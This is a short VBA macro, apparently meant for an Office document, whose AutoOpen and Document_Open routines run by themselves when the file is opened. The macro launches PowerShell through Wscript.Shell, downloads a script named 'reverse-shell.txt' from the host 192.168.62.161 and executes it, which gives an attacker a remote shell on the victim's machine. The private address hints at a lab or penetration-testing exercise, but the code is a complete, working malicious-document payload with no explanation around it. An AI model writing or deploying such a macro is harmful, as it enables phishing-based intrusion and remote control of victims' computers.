Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
Dim Str As String
Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.62.161:80/reverse-shell.txt'); iex 'powershell -E $code'"""
CreateObject("Wscript.Shell").Run Str
End Sub